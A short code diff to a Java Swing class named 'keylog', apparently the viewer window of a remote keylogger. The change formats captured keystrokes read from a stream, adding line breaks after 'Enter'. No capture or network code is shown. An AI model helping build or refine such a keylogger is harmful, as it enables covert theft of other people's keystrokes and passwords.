@@ -225,9 +225,10 @@ public class keylog extends javax.swing.JFrame {
             program.os.flush();
             
             String keyOut = program.is.readLine();
-            jTextArea1.append(keyOut);
+            jTextArea1.append(keyOut.replaceAll("Enter", "Enter\n"));
             
-        } catch (IOException ex) {
+            
+        } catch (IOException ex ) {
             throw new RuntimeException(ex);
         }
   
